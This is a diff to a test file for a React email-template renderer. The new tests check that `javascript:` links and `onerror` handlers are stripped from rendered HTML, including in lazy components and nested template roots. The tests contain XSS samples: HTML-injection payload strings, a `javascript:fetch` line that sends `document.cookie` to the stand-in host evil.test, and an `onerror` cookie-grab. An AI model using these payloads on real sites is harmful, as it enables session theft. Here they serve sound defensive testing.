@@ -14,13 +14,15 @@ import { beforeAll, describe, expect, it, vi } from "vitest";
 import React from "react";
 import { renderToHtml, renderToPlainText } from "../utils/render-to-html";
 import { renderToJson } from "../utils/render-to-json";
-import { Email, Page, Document, Row, Column, Paragraph, Heading, Button, Image, Link, Menu, Social, Html, Divider, Table, Video } from "../index";
+import { Email, Page, Document, Row, Column, Paragraph, Heading, Button, Image, Link, Menu, Social, Html, Divider, Table, Video, UnlayerProvider } from "../index";
+import { renderToHtml as asyncRenderToHtml } from "../async";
 import { designToElements } from "../codegen";
 import { evaluate } from "../codegen/test-harness";
 import { Tailwind, loadTailwind, type TailwindHandle } from "../tailwind";
 import { CLASS_LIMITS } from "../tailwind/declarations";
 import { Markdown } from "../markdown";
 import { growth, inTime, within } from "../test-timing";
+import * as asyncRenderers from "../async";
 
 const PAYLOADS = [
   '"><x-pwn></x-pwn>', "'><x-pwn></x-pwn>", '" x-pwn="1', "' x-pwn='1", "</p></div></td></tr></table><x-pwn></x-pwn>",
@@ -53,11 +55,12 @@ const CASES: Record<string, (v: string) => React.ReactElement> = {
   "Button link": (v) => <Row><Column><Button href={`https://example.com/${v}`}>Go</Button></Column></Row>,
   // A URL that isn't a string: an array, as a JSON body or `?url[]=` gives it.
   "Button link as an array": (v) => <Row><Column><Button href={[`https://example.com/${v}`] as never}>Go</Button></Column></Row>,
-  "Image link as an array": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt="x" href={[`https://example.com/${v}`] as never} /></Column></Row>,
+  // (An Image's link is its `action`: an `href` it doesn't take, said and left out.)
+  "Image link as an array": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt="x" action={{ name: "web", values: { href: [`https://example.com/${v}`] as never } }} /></Column></Row>,
   "Menu link as an array": (v) => <Row><Column><Menu items={[{ text: "Home", href: [`https://example.com/${v}`] as never }]} /></Column></Row>,
   "Image source": (v) => <Row><Column><Image src={`https://example.com/${v}.png`} width="100px" alt="x" /></Column></Row>,
   "Image text": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt={v} /></Column></Row>,
-  "Image link": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt="x" href={`https://example.com/${v}`} /></Column></Row>,
+  "Image link": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt="x" action={{ name: "web", values: { href: `https://example.com/${v}` } }} /></Column></Row>,
   "Menu item": (v) => <Row><Column><Menu items={[{ text: v, href: `https://example.com/${v}` }]} /></Column></Row>,
   // A link's target, written into its `target="…"` as it is.
   "Button target": (v) => <Row><Column><Button href="https://example.com" target={v}>Go</Button></Column></Row>,
@@ -202,7 +205,7 @@ describe("values that aren't strings, as data gives them (an array from a JSON b
     "Menu item target": (v) => <Row><Column><Menu items={[{ text: "Home", href: "https://example.com", target: v as never }]} /></Column></Row>,
     "Menu item text": (v) => <Row><Column><Menu items={[{ text: v as never, href: "https://example.com" }]} /></Column></Row>,
     "Button link": (v) => <Row><Column><Button href={v as never}>Go</Button></Column></Row>,
-    "Image link": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt="x" href={v as never} /></Column></Row>,
+    "Image link": (v) => <Row><Column><Image src="https://example.com/a.png" width="100px" alt="x" action={{ name: "web", values: { href: v as never } }} /></Column></Row>,
     "Menu link": (v) => <Row><Column><Menu items={[{ text: "Home", href: v as never }]} /></Column></Row>,
     "Social link": (v) => <Row><Column><Social icons={[{ name: "Twitter", url: v as never }]} /></Column></Row>,
     "Social name": (v) => <Row><Column><Social icons={[{ name: v as never, url: "https://twitter.com/x" }]} /></Column></Row>,
@@ -317,6 +320,27 @@ describe("a link's `javascript:` URL, as data gives it", () => {
       const design = renderToJson(<Email><Row><Column><Button href={url}>Go</Button></Column></Row></Email>);
       expect(design.body.rows[0].columns[0].contents[0].values.href.values.href).toBe(url);
     }
+  });
+
+  it.each(Object.entries(ROOTS))("%s: in markup a component of yours renders runs nothing, in a lazy one's too (React renders it itself) with React 18 too", async (_, Root) => {
+    // (A profile's website, from data, in an author line.)
+    const Author = ({ url }: { url: string }) => (
+      <p>
+        By <a href={url}>Mallory</a> <img src={url} alt="" />
+      </p>
+    );
+    const LazyAuthor = React.lazy(() => ({ then: (done: (m: { default: typeof Author }) => void) => done({ default: Author }) }) as Promise<{ default: typeof Author }>);
+    for (const url of [...URLS, "javascript:fetch('https://evil.test/?c='+document.cookie)"]) {
+      for (const Shown of [Author, LazyAuthor]) {
+        const template = <Root><Row><Column><Shown url={url} /><Paragraph>By <Shown url={url} /></Paragraph></Column></Row></Root>;
+        const links = [...urls(renderToHtml(template)), ...urls(await asyncRenderers.renderToHtml(template))];
+        expect(links.length, url).toBeGreaterThan(0);
+        expect([url, Shown === Author ? "plain" : "lazy", links.filter(runs)]).toEqual([url, Shown === Author ? "plain" : "lazy", []]);
+      }
+    }
+    // (The negative control: a URL that isn't one, kept.)
+    const kept = "https://example.com/?a=1&b=2";
+    expect(urls(renderToHtml(<Root><Row><Column><LazyAuthor url={kept} /></Column></Row></Root>))).toEqual([kept, kept]);
   });
 
   it("is written as react-dom 19 writes it, a URL that throws, where a Button's link would run", () => {
@@ -609,6 +633,25 @@ describe("HTML a sanitizer returned", () => {
     const handlers = Array.from(doc.querySelectorAll("*")).flatMap((el) => Array.from(el.attributes).filter((attr) => /^on/i.test(attr.name)).map((attr) => `${el.tagName} ${attr.name}`));
     expect(handlers).toEqual([]);
     expect(html).toContain('alt="<unlayer-mark"');
+  });
+});
+
+describe("a sanitizer configured for the render (`toSafeHtml`)", () => {
+  // A whole template reused as a section of another (its own root in the content, as README says it renders) went
+  // without it: its Html blocks' handlers were written as they were, where the same block in the outer root's content
+  // was sanitized. 0.2 kept them too.
+  const toSafeHtml = (html: string) => html.replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, "");
+  const cms = '<p>Spring sale!</p><img src="https://cms.example/broken.png" onerror="window.__pwned=document.cookie">';
+  const handlers = (html: string) => Array.from(new DOMParser().parseFromString(html, "text/html").querySelectorAll("*")).flatMap((el) => Array.from(el.attributes).filter((attr) => /^on/i.test(attr.name)).map((attr) => `${el.tagName} ${attr.name}`));
+  it.each(Object.entries(ROOTS))("%s: reaches the HTML of a root in the content, given as the render's option or a provider's", async (_, Root) => {
+    const PromoSection = ({ html }: { html: string }) => <Root><Row><Column><Html html={html} /></Column></Row></Root>;
+    const template = <Root><Row><Column><Paragraph>Newsletter</Paragraph></Column></Row><PromoSection html={cms} /></Root>;
+    vi.spyOn(console, "warn").mockImplementation(() => {});
+    for (const html of [renderToHtml(template, { toSafeHtml }), renderToHtml(<UnlayerProvider config={{ toSafeHtml }}>{template}</UnlayerProvider>), await asyncRenderToHtml(template, { toSafeHtml })]) {
+      expect(html).toContain("Spring sale!");
+      expect(handlers(html)).toEqual([]);
+    }
+    vi.restoreAllMocks();
   });
 });
 
